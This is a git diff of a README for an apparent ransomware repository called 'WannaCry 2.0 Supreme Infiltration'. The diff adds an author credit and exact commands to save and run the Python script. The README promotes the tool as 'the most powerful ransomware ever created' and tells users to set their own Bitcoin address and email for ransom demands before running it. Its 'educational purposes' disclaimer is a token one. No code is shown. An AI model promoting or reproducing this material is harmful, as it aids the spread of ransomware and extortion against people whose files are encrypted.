@@ -1,6 +1,4 @@
-# WannaCry-2.0-Supreme-Infiltration
-
-🔥 WannaCry 2.0 Supreme Infiltration 🔥
+🔥 WannaCry 2.0 Supreme Infiltration by 1cYinfinity 🔥
 
 🌌 Unleash chaos with the most powerful ransomware ever created!
 
@@ -14,9 +12,9 @@
 💻 Usage:
 1. Clone this repository.
 2. Customize Bitcoin address and email for ransom demands.
-3. Run the script, and watch as the darkness spreads!
+3. Save the script as: `WannaCry_2.0_Supreme_Infiltration.py`
+4. Run the script: `python WannaCry_2.0_Supreme_Infiltration.py`
 
-🚨 Disclaimer: This creation is for educational purposes only. The author assumes no responsibility for its misuse.
+🚨 Disclaimer: This creation is for educational purposes only. The author, 1cYinfinity, proudly presents this work.
 
 ⚠️ Use with caution. The shadows may not always shield you.
-
